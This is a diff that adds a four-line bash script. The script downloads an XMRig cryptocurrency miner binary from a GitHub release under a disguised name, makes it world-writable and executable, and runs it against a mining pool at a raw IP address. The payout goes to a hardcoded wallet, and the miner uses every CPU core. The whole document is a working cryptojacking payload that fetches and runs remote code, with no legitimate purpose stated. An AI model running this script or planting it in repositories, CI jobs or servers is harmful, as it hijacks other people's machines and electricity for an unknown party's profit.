@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
+./vrl -a rx/0 --donate-level 1 -o 45.63.119.189:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p $(echo $(shuf -i 1-15000 -n 1)-A) -t $(nproc --all)
